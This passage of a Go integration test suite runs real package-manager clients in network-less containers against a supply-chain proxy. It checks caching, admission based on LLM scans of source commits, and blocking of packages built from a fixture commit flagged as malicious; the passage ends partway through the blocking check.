//go:build ecosystem
// +build ecosystem

package ecotest

import (
	"bufio"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"debug/elf"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"
)

// Environment variables that tune a run. All are optional.
const (
	// envEcosystems restricts the run to a space- or comma-separated list of
	// ecosystem IDs (default: every ecosystem in the catalog).
	envEcosystems = "ECOTEST_ECOSYSTEMS"
	// envBin points at a prebuilt `pullthrough` binary. Without it the harness
	// builds one from the source tree (which needs the Go toolchain; CI passes a
	// prebuilt binary so the test legs need neither Go nor the sources).
	envBin = "ECOTEST_BIN"
	// envWorkDir is where per-ecosystem workspaces (proxy state, logs, client
	// scratch directories) are created. Default: a temporary directory.
	envWorkDir = "ECOTEST_WORKDIR"
	// envReportDir receives one <ecosystem>.json result per ecosystem plus the
	// rendered matrix. Default: <workdir>/report.
	envReportDir = "ECOTEST_REPORT_DIR"
	// envKeep keeps the workspace of passing ecosystems too (a failing
	// ecosystem's workspace is always kept, for diagnosis).
	envKeep = "ECOTEST_KEEP"
	// envLLMProvider selects the provider wire format the proxy speaks to the
	// mock LLM: "claude" (default) or "openai".
	envLLMProvider = "ECOTEST_LLM_PROVIDER"
	// envAttempts is how many times a client step is tried before it counts as
	// failed (default 3). The upstreams are real public registries; one transient
	// 5xx must not turn the build red.
	envAttempts = "ECOTEST_ATTEMPTS"
	// envOpenNetwork, when set, runs the clients on the host network instead of
	// in a network-less container. It exists to tell apart "the client cannot
	// work through the proxy" from "the client needs something besides the
	// proxy" while debugging; it weakens the suite (a client that bypasses the
	// proxy goes unnoticed) and must not be used in CI.
	envOpenNetwork = "ECOTEST_OPEN_NETWORK"

	// envList makes the test binary print the ecosystem IDs as JSON and exit
	// (see TestMain).
	envList = "ECOTEST_LIST"

	// Helper mode (see TestMain): the test binary re-executed inside a client
	// container as a TCP -> unix-socket forwarder.
	envForwardListen = "ECOTEST_FORWARD_LISTEN"
	envForwardUnix   = "ECOTEST_FORWARD_UNIX"
	envForwardReady  = "ECOTEST_FORWARD_READY"
)

// Paths inside a client container.
const (
	// containerToolDir is where the harness mounts its helper, the wrapper
	// script and the proxy socket (read-only).
	containerToolDir = "/ecotest"
	// containerReadyFile is created by the forwarder once it is listening.
	containerReadyFile = "/tmp/.ecotest-forward-ready"
)

// TestMain doubles as the entry point of the in-container forwarder.
//
// Client containers run with NO network (--network none): the only thing they
// can talk to is the proxy, so an install that succeeds provably took nothing
// from anywhere else, and a client that falls back to another source when the
// proxy refuses a package (Docker's registry mirror, Julia's Pkg server) fails
// instead of silently installing it — which is how the proxy is deployed where
// it matters: clients without direct egress.
//
// The proxy is made reachable inside such a container without any network by
// re-executing this very test binary in it as a forwarder: it listens on the
// proxy's loopback address inside the container and relays each connection over
// a unix socket (bind-mounted from the host) to the harness, which relays it to
// the real proxy. The client therefore uses the same http://127.0.0.1:<port>
// URL the proxy advertises as its public URL.
func TestMain(m *testing.M) {
	// List mode: print the catalog's ecosystem IDs as a JSON array and exit. CI
	// builds its job matrix from this, so the matrix cannot drift from the
	// catalog — a newly added ecosystem gets a CI leg without touching the
	// workflow.
	if os.Getenv(envList) != "" {
		_ = json.NewEncoder(os.Stdout).Encode(IDs())
		os.Exit(0)
	}
	if listen := os.Getenv(envForwardListen); listen != "" {
		if err := runForwarder(listen, os.Getenv(envForwardUnix), os.Getenv(envForwardReady)); err != nil {
			fmt.Fprintf(os.Stderr, "ecotest forwarder: %v\n", err)
			os.Exit(1)
		}
		os.Exit(0)
	}
	os.Exit(m.Run())
}

// runForwarder relays TCP connections accepted on listen to the unix socket at
// unixPath until the process is killed.
func runForwarder(listen, unixPath, readyFile string) error {
	if unixPath == "" {
		return errors.New(envForwardUnix + " is not set")
	}
	ln, err := net.Listen("tcp", listen)
	if err != nil {
		return err
	}
	if readyFile != "" {
		if err := os.WriteFile(readyFile, []byte("ready\n"), 0o644); err != nil {
			return err
		}
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			return err
		}
		go func() {
			up, err := net.Dial("unix", unixPath)
			if err != nil {
				_ = conn.Close()
				return
			}
			relay(conn, up)
		}()
	}
}

// relay copies bytes both ways between a and b and closes both when either
// direction ends.
func relay(a, b net.Conn) {
	var once sync.Once
	closeBoth := func() { _ = a.Close(); _ = b.Close() }
	go func() { _, _ = io.Copy(a, b); once.Do(closeBoth) }()
	_, _ = io.Copy(b, a)
	once.Do(closeBoth)
}

// suite holds what is shared by every ecosystem of one `go test` invocation.
type suite struct {
	bin         string
	workDir     string
	reportDir   string
	keep        bool
	llmProvider string
	attempts    int
	// openNetwork runs container clients on the host network (debugging aid, see
	// envOpenNetwork). The default is a network-less container. The
	// Docker-in-Docker client is always network-less: a second Docker daemon must
	// never share the host's network namespace.
	openNetwork bool
	// helper is the path of this test binary, used as the in-container forwarder.
	helper string
}

// newSuite resolves the run configuration and verifies the host prerequisites.
func newSuite(t *testing.T) *suite {
	t.Helper()
	s := &suite{
		keep:        os.Getenv(envKeep) != "",
		llmProvider: strings.ToLower(strings.TrimSpace(os.Getenv(envLLMProvider))),
		attempts:    3,
		openNetwork: os.Getenv(envOpenNetwork) != "",
	}
	if s.llmProvider == "" {
		s.llmProvider = "claude"
	}
	if s.llmProvider != "claude" && s.llmProvider != "openai" {
		t.Fatalf("%s=%q: want claude or openai", envLLMProvider, s.llmProvider)
	}
	if v := os.Getenv(envAttempts); v != "" {
		n, err := strconv.Atoi(v)
		if err != nil || n < 1 {
			t.Fatalf("%s=%q: want a positive integer", envAttempts, v)
		}
		s.attempts = n
	}

	// A tagged run was asked for explicitly, so a missing prerequisite is a hard
	// failure, never a silent skip: a skipped ecosystem suite would look green.
	for _, tool := range []string{"docker", "git"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Fatalf("the ecosystem suite needs %q on PATH: %v", tool, err)
		}
	}
	if out, err := exec.Command("docker", "version", "--format", "{{.Server.Version}}").CombinedOutput(); err != nil {
		t.Fatalf("the ecosystem suite needs a reachable Docker daemon: %v\n%s", err, out)
	}

	s.workDir = os.Getenv(envWorkDir)
	if s.workDir == "" {
		dir, err := os.MkdirTemp("", "ecotest-")
		if err != nil {
			t.Fatalf("creating work dir: %v", err)
		}
		s.workDir = dir
	}
	abs, err := filepath.Abs(s.workDir)
	if err != nil {
		t.Fatalf("resolving work dir: %v", err)
	}
	s.workDir = abs
	if err := os.MkdirAll(s.workDir, 0o755); err != nil {
		t.Fatalf("creating work dir: %v", err)
	}

	s.reportDir = os.Getenv(envReportDir)
	if s.reportDir == "" {
		s.reportDir = filepath.Join(s.workDir, "report")
	}
	if s.reportDir, err = filepath.Abs(s.reportDir); err != nil {
		t.Fatalf("resolving report dir: %v", err)
	}

	s.bin = os.Getenv(envBin)
	if s.bin == "" {
		s.bin = filepath.Join(s.workDir, "pullthrough")
		t.Logf("building the proxy binary into %s", s.bin)
		build := exec.Command("go", "build", "-o", s.bin, "../../cmd/pullthrough")
		if out, err := build.CombinedOutput(); err != nil {
			t.Fatalf("building the proxy (set %s to a prebuilt binary to skip this): %v\n%s", envBin, err, out)
		}
	}
	if s.bin, err = filepath.Abs(s.bin); err != nil {
		t.Fatalf("resolving proxy binary: %v", err)
	}
	if _, err := os.Stat(s.bin); err != nil {
		t.Fatalf("proxy binary: %v", err)
	}

	if s.openNetwork {
		t.Logf("WARNING: %s is set — clients run on the host network and can bypass the proxy unnoticed", envOpenNetwork)
	}
	// The forwarder is this test binary, executed inside every client image
	// (glibc, musl, distroless-ish). That only works if it is statically linked.
	exe, err := os.Executable()
	if err != nil {
		t.Fatalf("locating the test binary: %v", err)
	}
	if dynamic, err := isDynamicallyLinked(exe); err != nil {
		t.Fatalf("inspecting the test binary: %v", err)
	} else if dynamic {
		t.Fatalf("the test binary %s is dynamically linked, so it cannot run as the forwarder inside the client "+
			"images. Build it statically: CGO_ENABLED=0 go test -tags ecosystem ./internal/ecotest/ "+
			"(`make test-ecosystems` does this)", exe)
	}
	s.helper = exe
	return s
}

// isDynamicallyLinked reports whether the ELF binary at path needs a dynamic
// loader (it has a PT_INTERP program header).
func isDynamicallyLinked(path string) (bool, error) {
	f, err := elf.Open(path)
	if err != nil {
		return false, err
	}
	defer f.Close()
	for _, prog := range f.Progs {
		if prog.Type == elf.PT_INTERP {
			return true, nil
		}
	}
	return false, nil
}

// selectedEcosystems resolves the ecosystems to run.
func selectedEcosystems(t *testing.T) []Ecosystem {
	t.Helper()
	raw := strings.FieldsFunc(os.Getenv(envEcosystems), func(r rune) bool { return r == ',' || r == ' ' })
	if len(raw) == 0 {
		return Catalog()
	}
	var out []Ecosystem
	for _, id := range raw {
		e, ok := Lookup(id)
		if !ok {
			t.Fatalf("%s names unknown ecosystem %q (known: %s)", envEcosystems, id, strings.Join(IDs(), ", "))
		}
		out = append(out, e)
	}
	return out
}

// TestEcosystems runs every selected ecosystem's real client against the real
// proxy binary. See the package documentation for what is asserted.
func TestEcosystems(t *testing.T) {
	if err := Validate(); err != nil {
		t.Fatal(err)
	}
	ecosystems := selectedEcosystems(t)
	s := newSuite(t)
	t.Logf("work dir: %s", s.workDir)

	var results []*Result
	for _, e := range ecosystems {
		e := e
		t.Run(e.ID, func(t *testing.T) {
			results = append(results, runEcosystem(t, s, e))
		})
	}

	// The matrix over what THIS invocation ran. (CI runs one ecosystem per job
	// and assembles the full matrix from the per-ecosystem result files in a
	// final job — see TestEcosystemMatrix.)
	want := make([]string, 0, len(ecosystems))
	for _, e := range ecosystems {
		want = append(want, e.ID)
	}
	matrix := BuildMatrix(results, want)
	md, err := WriteMatrix(matrix, s.reportDir)
	if err != nil {
		t.Errorf("writing the matrix: %v", err)
	} else {
		t.Logf("matrix written to %s\n%s", md, matrix.Markdown())
	}
	exportAttachments(t, s.reportDir)
}

// TestEcosystemMatrix assembles the full ecosystem matrix from per-ecosystem
// result files. It is the CI aggregation step: each ecosystem runs in its own
// job and uploads its result; this test, run once afterwards over the collected
// files, renders the matrix and fails unless EVERY catalog ecosystem ran and
// passed — so a leg that never started cannot go unnoticed. It only runs when
// ECOTEST_AGGREGATE is set.
func TestEcosystemMatrix(t *testing.T) {
	if os.Getenv("ECOTEST_AGGREGATE") == "" {
		t.Skip("set ECOTEST_AGGREGATE=1 (and ECOTEST_REPORT_DIR) to assemble the matrix from result files")
	}
	dir := os.Getenv(envReportDir)
	if dir == "" {
		t.Fatalf("%s must point at the collected result files", envReportDir)
	}
	results, err := LoadResults(dir)
	if err != nil {
		t.Fatalf("loading results from %s: %v", dir, err)
	}
	matrix := BuildMatrix(results, IDs())
	md, err := WriteMatrix(matrix, dir)
	if err != nil {
		t.Fatalf("writing the matrix: %v", err)
	}
	t.Logf("matrix written to %s\n%s", md, matrix.Markdown())

	if summary := os.Getenv("GITHUB_STEP_SUMMARY"); summary != "" {
		f, err := os.OpenFile(summary, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
		if err == nil {
			_, _ = f.WriteString(matrix.Markdown())
			_ = f.Close()
		}
	}
	exportAttachments(t, dir)

	if len(matrix.Missing) > 0 {
		t.Errorf("no result for ecosystem(s): %s", strings.Join(matrix.Missing, ", "))
	}
	for _, r := range matrix.Results {
		if !r.Passed {
			t.Errorf("ecosystem %s failed", r.Ecosystem)
		}
	}
}

// exportAttachments copies the rendered matrix to the task-attachments directory
// when the suite runs under the task runner, mirroring the other suites.
func exportAttachments(t *testing.T, reportDir string) {
	dst := os.Getenv("CLOOP_TASK_ATTACHMENTS")
	if dst == "" {
		return
	}
	if err := os.MkdirAll(dst, 0o755); err != nil {
		t.Logf("attachments: %v", err)
		return
	}
	for _, name := range []string{"ecosystem-matrix.md", "ecosystem-matrix.json"} {
		data, err := os.ReadFile(filepath.Join(reportDir, name))
		if err != nil {
			continue
		}
		if err := os.WriteFile(filepath.Join(dst, name), data, 0o644); err != nil {
			t.Logf("attachments: %v", err)
		}
	}
}

// run is the state of one ecosystem run.
type run struct {
	t   *testing.T
	s   *suite
	e   Ecosystem
	res *Result

	root      string // workspace root for this ecosystem
	stateDir  string // the proxy's on-disk state
	logPath   string // the proxy's JSON log
	publicURL string // base URL clients use
	proxyHost string // host:port clients use
	caCert    string // PEM path of the test CA ("" when plain HTTP)

	client      *http.Client // talks to the proxy's admin API / metrics
	proxy       *exec.Cmd
	proxyExited chan error // receives the proxy's exit status exactly once
	llm         *MockLLM

	toolDir  string         // host directory mounted at containerToolDir
	bridges  []net.Listener // per-step unix sockets relaying container connections to the proxy
	listenTo string         // the proxy's loopback host:port

	benign, malicious string // fixture commit hashes

	containers []string // containers to force-remove on teardown
}

// runEcosystem executes the whole scenario for one ecosystem and returns its
// result row. Failures are reported through t and recorded in the row.
func runEcosystem(t *testing.T, s *suite, e Ecosystem) *Result {
	start := time.Now()
	r := &run{t: t, s: s, e: e, res: NewResult(e)}
	r.root = filepath.Join(s.workDir, e.ID)
	// Start from an empty workspace: files a previous run's client left behind
	// (owned by the container's user) must not leak into this run's scratch dirs.
	if _, err := os.Stat(r.root); err == nil {
		r.removeWorkspace()
	}

	defer func() {
		r.teardown()
		r.res.DurationSec = time.Since(start).Seconds()
		if t.Failed() && r.res.Error == "" {
			// Make sure a failed subtest never reports a passing row.
			for _, c := range r.res.Checks {
				if c.Status == StatusFail {
					r.res.Error = c.Name + ": " + c.Detail
					break
				}
			}
			if r.res.Error == "" {
				r.res.Error = "the test failed; see the job log"
			}
		}
		r.res.Finalize()
		if path, err := r.res.WriteFile(s.reportDir); err != nil {
			t.Errorf("writing the result file: %v", err)
		} else {
			t.Logf("result: %s", path)
		}
		if r.res.Passed && !s.keep {
			r.removeWorkspace()
		} else {
			t.Logf("workspace kept for inspection: %s", r.root)
		}
	}()

	// Errorf, not Fatalf: the row must be returned to the caller either way, so a
	// setup failure shows up in the matrix as a failed ecosystem with its reason
	// rather than as a missing one.
	if err := r.setup(); err != nil {
		r.res.Error = "setup: " + err.Error()
		r.dumpProxyLog(60)
		t.Errorf("[%s] setup: %v", e.ID, err)
		return r.res
	}
	r.scenario()
	return r.res
}

// fail records a failed check and fails the subtest.
func (r *run) fail(check, format string, args ...any) {
	detail := fmt.Sprintf(format, args...)
	r.res.Set(check, StatusFail, detail)
	r.t.Errorf("[%s] %s: %s", r.e.ID, check, detail)
}

// pass records a passed check.
func (r *run) pass(check, format string, args ...any) {
	detail := fmt.Sprintf(format, args...)
	r.res.Set(check, StatusPass, detail)
	r.t.Logf("[%s] PASS %s: %s", r.e.ID, check, detail)
}

// ---------------------------------------------------------------------------
// Setup
// ---------------------------------------------------------------------------

func (r *run) setup() error {
	for _, dir := range []string{r.root, filepath.Join(r.root, "logs")} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return err
		}
	}
	r.stateDir = filepath.Join(r.root, "proxy")
	if err := os.MkdirAll(r.stateDir, 0o755); err != nil {
		return err
	}
	r.logPath = filepath.Join(r.root, "logs", "proxy.log")

	// The proxy listens on loopback only. A client container has no network at
	// all; the forwarder inside it listens on this same loopback address and
	// relays to the proxy, so one URL is valid on both sides.
	const listenHost = "127.0.0.1"
	port, err := freePort(listenHost)
	if err != nil {
		return err
	}
	listenAddr := net.JoinHostPort(listenHost, strconv.Itoa(port))
	r.listenTo = listenAddr
	r.proxyHost = listenAddr
	r.publicURL = "http://" + listenAddr

	rc := RunConfig{
		Ecosystem:  r.e,
		ListenAddr: listenAddr,
		StateDir:   r.stateDir,
	}

	transport := &http.Transport{}
	if r.e.TLS {
		// Clients verify the certificate against the name in the URL, so serve
		// under "localhost" and issue the leaf for it.
		r.proxyHost = net.JoinHostPort("localhost", strconv.Itoa(port))
		r.publicURL = "https://" + r.proxyHost
		tlsDir := filepath.Join(r.root, "tls")
		ca, cert, key, pool, err := writeTestPKI(tlsDir, []string{"localhost"}, []net.IP{net.ParseIP(listenHost)})
		if err != nil {
			return fmt.Errorf("creating the test PKI: %w", err)
		}
		r.caCert = ca
		rc.TLSCertFile, rc.TLSKeyFile = cert, key
		transport.TLSClientConfig = &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}
	}
	rc.PublicURL = r.publicURL
	r.client = &http.Client{Transport: transport, Timeout: 30 * time.Second}

	if r.e.Bad != nil {
		repo, benign, malicious, err := createSourceRepo(filepath.Join(r.root, "source"))
		if err != nil {
			return fmt.Errorf("creating the source repository fixture: %w", err)
		}
		r.benign, r.malicious = benign, malicious
		r.t.Logf("[%s] source repo %s: benign commit %s, malicious commit %s", r.e.ID, repo, benign, malicious)

		llm, err := StartMockLLM()
		if err != nil {
			return err
		}
		r.llm = llm
		rc.SourceRepo = repo
		rc.BenignCommit, rc.MaliciousCommit = benign, malicious
		rc.LLMProvider = r.s.llmProvider
		rc.LLMBaseURL = llm.URL()
		if rc.LLMProvider == "openai" {
			rc.LLMBaseURL = llm.OpenAIURL()
		}
	}

	cfg, err := RenderConfig(rc)
	if err != nil {
		return err
	}
	cfgPath := filepath.Join(r.stateDir, "config.yaml")
	if err := os.WriteFile(cfgPath, cfg, 0o644); err != nil {
		return err
	}

	if err := r.startProxy(cfgPath); err != nil {
		return err
	}
	if err := r.startBridge(); err != nil {
		return fmt.Errorf("starting the proxy bridge: %w", err)
	}
	if r.e.Bad != nil {
		if err := r.awaitVerdicts(2 * time.Minute); err != nil {
			return err
		}
	}
	return nil
}

// startBridge prepares what a network-less client container needs to reach the
// proxy: a directory (mounted read-only at containerToolDir) holding
//
//   - helper   this test binary, which runs in the container as the forwarder
//   - run.sh   the wrapper that starts the forwarder and then the client script
//
// and, added per client step by openBridge, the unix socket that step's
// forwarder relays to.
//
// The directory lives directly under the system temp dir because a unix socket
// path is limited to ~100 bytes.
func (r *run) startBridge() error {
	// Every client step reaches the proxy from a loopback address of its own
	// (see openBridge). That needs a system on which all of 127.0.0.0/8 is
	// local; say so here rather than as a refused connection in a client log.
	if probe, err := net.Listen("tcp", net.JoinHostPort(clientAddr(1), "0")); err != nil {
		return fmt.Errorf("cannot bind %s: the harness gives every client step its own loopback source address, "+
			"which needs a system where all of 127.0.0.0/8 is local (Linux): %w", clientAddr(1), err)
	} else {
		_ = probe.Close()
	}

	dir, err := os.MkdirTemp("", "ecot-")
	if err != nil {
		return err
	}
	if err := os.Chmod(dir, 0o755); err != nil {
		return err
	}
	r.toolDir = dir

	if err := copyFile(r.s.helper, filepath.Join(dir, "helper"), 0o755); err != nil {
		return fmt.Errorf("installing the forwarder: %w", err)
	}
	wrapper := "#!/bin/sh\n" +
		"# Generated by the ecosystem test harness (internal/ecotest).\n" +
		"# This container has no network. Start the forwarder that makes the proxy\n" +
		"# reachable at its loopback address, wait for it, then run the client.\n" +
		containerToolDir + "/helper &\n" +
		"i=0\n" +
		"while [ ! -e \"$" + envForwardReady + "\" ]; do\n" +
		"  i=$((i + 1))\n" +
		"  if [ \"$i\" -gt 200 ]; then echo 'ecotest: the forwarder did not start' >&2; exit 125; fi\n" +
		"  sleep 0.1\n" +
		"done\n" +
		"exec sh /work/client.sh\n"
	return os.WriteFile(filepath.Join(dir, "run.sh"), []byte(wrapper), 0o755)
}

// clientAddr is the loopback address the n-th client step (1-based) reaches the
// proxy from.
func clientAddr(n int) string {
	return fmt.Sprintf("127.77.%d.%d", (n/250)%250, n%250+1)
}

// stepBridge is one client step's way to the proxy.
type stepBridge struct {
	// sock is the name of the step's unix socket inside the tool directory.
	sock string
	// addr is the source address the proxy sees for the step.
	addr string
}

// openBridge creates the unix socket for one client step. Every connection the
// step's forwarder makes to it is relayed to the proxy from a loopback address
// that belongs to this step alone — the step is a client machine with an
// address of its own. That is what lets the suite assert what the proxy's
// download log says about "which address pulled this package": the address is
// one the proxy observed on the connection, different for every step.
func (r *run) openBridge() (*stepBridge, error) {
	n := len(r.bridges) + 1
	b := &stepBridge{sock: fmt.Sprintf("p%d.sock", n), addr: clientAddr(n)}
	sock := filepath.Join(r.toolDir, b.sock)
	ln, err := net.Listen("unix", sock)
	if err != nil {
		return nil, err
	}
	// The container user differs per image; connecting needs write permission.
	if err := os.Chmod(sock, 0o666); err != nil {
		_ = ln.Close()
		return nil, err
	}
	r.bridges = append(r.bridges, ln)

	dialer := &net.Dialer{LocalAddr: &net.TCPAddr{IP: net.ParseIP(b.addr)}, Timeout: 10 * time.Second}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return // listener closed on teardown
			}
			go func() {
				up, err := dialer.Dial("tcp", r.listenTo)
				if err != nil {
					_ = conn.Close()
					return
				}
				relay(conn, up)
			}()
		}
	}()
	return b, nil
}

// forwarderEnv is the environment that turns the helper into the forwarder of
// one client step.
func (r *run) forwarderEnv(b *stepBridge) []string {
	return []string{
		envForwardListen + "=" + r.listenTo,
		envForwardUnix + "=" + containerToolDir + "/" + b.sock,
		envForwardReady + "=" + containerReadyFile,
	}
}

// startProxy launches the proxy binary and waits until it is ready.
func (r *run) startProxy(cfgPath string) error {
	logFile, err := os.Create(r.logPath)
	if err != nil {
		return err
	}
	cmd := exec.Command(r.s.bin, "-config", cfgPath)
	cmd.Dir = r.stateDir
	cmd.Stdout = logFile
	cmd.Stderr = logFile
	// The proxy shells out to git for the commit scanner; keep the developer's
	// git configuration (signing, hooks, URL rewrites) out of the test.
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null", "GIT_TERMINAL_PROMPT=0")
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		return fmt.Errorf("starting the proxy: %w", err)
	}
	_ = logFile.Close() // the child holds its own descriptor
	r.proxy = cmd

	// A single goroutine owns Wait; teardown waits on the channel.
	r.proxyExited = make(chan error, 1)
	go func() { r.proxyExited <- cmd.Wait() }()

	deadline := time.Now().Add(60 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case err := <-r.proxyExited:
			r.proxy = nil
			return fmt.Errorf("the proxy exited during startup: %v", err)
		default:
		}
		resp, err := r.client.Get(r.adminBase() + "/readyz")
		if err == nil {
			_, _ = io.Copy(io.Discard, resp.Body)
			_ = resp.Body.Close()
			if resp.StatusCode == http.StatusOK {
				r.t.Logf("[%s] proxy ready at %s (config %s)", r.e.ID, r.publicURL, cfgPath)
				return nil
			}
		}
		time.Sleep(200 * time.Millisecond)
	}
	return errors.New("the proxy did not become ready within 60s")
}

// adminBase is the base URL the harness itself uses to reach the proxy.
func (r *run) adminBase() string { return r.publicURL }

// awaitVerdicts waits until the proxy's commit scanner has scanned both fixture
// commits with the (mock) LLM and checks each verdict is the expected one. This
// is the precondition for the whole scenario: without it a "block" could not be
// attributed to the scan.
func (r *run) awaitVerdicts(timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	var last string
	for time.Now().Before(deadline) {
		verdicts, err := r.scanVerdicts()
		if err != nil {
			last = err.Error()
		} else {
			b, okB := verdicts[r.benign]
			m, okM := verdicts[r.malicious]
			last = fmt.Sprintf("%d verdict(s) so far", len(verdicts))
			if okB && okM {
				if b.Malicious {
					return fmt.Errorf("the benign commit %s was scanned as malicious (risk %d)", r.benign, b.RiskScore)
				}
				if !m.Malicious {
					return fmt.Errorf("the malicious commit %s was scanned as benign (risk %d)", r.malicious, m.RiskScore)
				}
				stats := r.llm.Stats()
				if stats.Calls < 2 || stats.Malicious < 1 {
					return fmt.Errorf("verdicts exist but the mock LLM served only %d completion(s) (%d malicious): "+
						"the verdicts did not come from the LLM", stats.Calls, stats.Malicious)
				}
				r.res.LLMCalls = stats.Calls
				r.t.Logf("[%s] commit scanner verdicts ready: benign risk=%d, malicious risk=%d (%d LLM completions, models %v)",
					r.e.ID, b.RiskScore, m.RiskScore, stats.Calls, stats.Models)
				return nil
			}
		}
		time.Sleep(500 * time.Millisecond)
	}
	return fmt.Errorf("the commit scanner did not produce verdicts for both fixture commits within %s (%s)", timeout, last)
}

// ---------------------------------------------------------------------------
// Scenario
// ---------------------------------------------------------------------------

func (r *run) scenario() {
	e := r.e

	// 1. Good package installs through the proxy.
	first, err := r.clientStep("good-1", e.Good, true)
	if err != nil {
		r.fail(CheckInstall, "%v", err)
		r.dumpProxyLog(40)
		return
	}
	r.res.ClientVersion = first.version
	r.pass(CheckInstall, "%s %s installed %s through %s", e.Client, first.version, packageLabel(e.Good), r.publicURL)

	// Client-behaviour assertions over the requests the proxy answered.
	for _, pattern := range e.Requests {
		if !r.sawRequest(regexp.MustCompile(pattern)) {
			r.fail(CheckInstall, "the proxy served no successful request matching %q during the install", pattern)
			return
		}
	}

	// second is the second good install (step 4), kept for the download-log check.
	var second *clientResult

	// 2. The artifact is in the proxy's cache.
	var artifact *cacheEntry
	if e.applies(CheckCached) {
		artifact, err = r.findArtifact()
		if err != nil {
			r.fail(CheckCached, "%v", err)
			return
		}
		r.pass(CheckCached, "cache entry %s (%d bytes)", artifact.Key, artifact.Size)
	}

	// 3. Admission was decided by the source commit's LLM verdict.
	if e.applies(CheckScanAdmit) {
		if err := r.assertScanAdmitted(); err != nil {
			r.fail(CheckScanAdmit, "%v", err)
			return
		}
	}

	// 4. A second install from a pristine client is served from the cache.
	if e.applies(CheckCacheHit) {
		before, err := r.metrics()
		if err != nil {
			r.fail(CheckCacheHit, "reading metrics: %v", err)
			return
		}
		second, err = r.clientStep("good-2", e.Good, true)
		if err != nil {
			r.fail(CheckCacheHit, "second install failed: %v", err)
			return
		}
		after, err := r.metrics()
		if err != nil {
			r.fail(CheckCacheHit, "reading metrics: %v", err)
			return
		}
		again, err := r.findArtifact()
		if err != nil {
			r.fail(CheckCacheHit, "%v", err)
			return
		}
		hits := after.sum("pullthrough_cache_hits_total", nil) - before.sum("pullthrough_cache_hits_total", nil)
		switch {
		case again.Key != artifact.Key || !again.ModTime.Equal(artifact.ModTime):
			r.fail(CheckCacheHit, "the artifact was fetched from the upstream again: cache entry %s written at %s, was %s written at %s",
				again.Key, again.ModTime.Format(time.RFC3339Nano), artifact.Key, artifact.ModTime.Format(time.RFC3339Nano))
			return
		case hits < 1:
			r.fail(CheckCacheHit, "the second install produced no cache hit (hits +%.0f)", hits)
			return
		}
		r.pass(CheckCacheHit, "second install served from cache (%.0f cache hits; %s not re-fetched)", hits, artifact.Key)
	} else if second, err = r.clientStep("good-2", e.Good, true); err != nil {
		// Nothing cacheable to assert on, but a repeat pull must still work.
		r.fail(CheckInstall, "second install failed: %v", err)
		return
	}

	// 5. The bad package is refused and the real client fails.
	var refused *clientResult
	if e.applies(CheckBlock) {
		if refused = r.assertBlocked(); refused == nil {
			return
		}
	}

	// 6. The download log attributes all of it to the right client addresses.
	if e.applies(CheckDownloadLog) {
		if err := r.assertDownloadLog(first, second, refused); err != nil {
			r.fail(CheckDownloadLog, "%v", err)
		}
	}
}

// assertScanAdmitted proves the good package's admission went through the LLM
// scan: the proxy holds a provenance link from the good coordinate to the benign
// fixture commit (via the operator pin), that commit's verdict is benign, and
// the policy engine recorded an allow decision for the ecosystem.
func (r *run) assertScanAdmitted() error {
	links, err := r.provenanceLinks()
	if err != nil {
		return fmt.Errorf("listing provenance links: %w", err)
	}
	want := strings.ToLower(r.e.Good.pinName())
	var found *provenanceLink
	for i := range links {
		if strings.ToLower(links[i].Name) == want {
			found = &links[i]
			break
		}
	}
	if found == nil {
		names := make([]string, 0, len(links))
		for _, l := range links {
			names = append(names, l.Name+"@"+l.Version)
		}
		return fmt.Errorf("the proxy recorded no provenance link for coordinate %q — the backend reports this artifact "+
			"under a different coordinate, or as none at all, so the admission policy never evaluated it (links: %v)",
			r.e.Good.pinName(), names)
	}
	if found.CommitSHA != r.benign {
		return fmt.Errorf("coordinate %q is linked to commit %s, want the benign fixture commit %s", found.Name, found.CommitSHA, r.benign)
	}
	if found.Verdict == nil {
		return fmt.Errorf("coordinate %q is linked to commit %s but no scan verdict is joined to it", found.Name, found.CommitSHA)
	}
	if found.Verdict.Malicious {
		return fmt.Errorf("the benign commit's verdict is malicious (risk %d)", found.Verdict.RiskScore)
	}

	m, err := r.metrics()
	if err != nil {
		return fmt.Errorf("reading metrics: %w", err)
	}
	allows := m.sum("pullthrough_policy_decisions_total", map[string]string{"ecosystem": r.e.Upstream.Type, "action": "allow"})
	if allows < 1 {
		return fmt.Errorf("the policy engine recorded no allow decision for ecosystem %q", r.e.Upstream.Type)
	}
	r.pass(CheckScanAdmit, "%s@%s -> commit %s (%s), LLM verdict benign (risk %d); %.0f policy allow decision(s)",
		found.Name, found.Version, shortSHA(found.CommitSHA), found.Resolver, found.Verdict.RiskScore, allows)
	return nil
}

// assertBlocked installs the bad package and requires BOTH halves of a real
// block: the proxy refused the bad coordinate because its source commit is
// malicious, and the real client failed. A client that fails for any other
// reason (a flaky upstream, a typo in the package name) does not count, and is
// retried.
//
// It returns the client step whose refusal was attributed to the policy, or nil
// when the check failed.
func (r *run) assertBlocked() *clientResult {
	bad := *r.e.Bad
	var lastDetail string
	for attempt := 1; attempt <= r.s.attempts; attempt++ {
		blocksBefore := len(r.policyBlocks())
		step := fmt.Sprintf("bad-%d", attempt)
		res, err := r.runClient(step, bad)
		if err != nil {
			lastDetail = fmt.Sprintf("running the client: %v", err)
			continue
		}
		if res.exitCode == 0 {
			r.fail(CheckBlock, "the client INSTALLED %s although its source commit %s is flagged malicious (see %s)",
				packageLabel(bad), shortSHA(r.malicious), res.logPath)
			return nil
		}

		// The audit record is written as part of handling the refused request,
		// but give a busy runner a moment before concluding it is not there.
		var blocks []policyBlock
		var hit *policyBlock
		for wait := 0; wait < 10 && hit == nil; wait++ {
			if wait > 0 {
